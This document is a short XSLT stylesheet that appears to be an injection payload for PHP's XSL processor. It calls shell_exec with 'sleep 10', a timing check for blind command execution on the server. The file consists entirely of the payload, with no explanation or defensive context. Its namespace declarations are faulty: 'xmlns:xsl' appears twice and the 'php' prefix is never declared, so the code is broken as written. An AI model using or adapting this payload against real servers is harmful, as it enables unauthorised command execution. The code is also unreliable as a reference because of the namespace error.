<xsl:stylesheet version="1.0" 
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:xsl="http://php.net/xsl">
	
	<xsl:output method="html"/>
	<xsl:template match="/">
		<xsl:value-of select="php:function('shell_exec','sleep 10')" />
	</xsl:template>
</xsl:stylesheet>
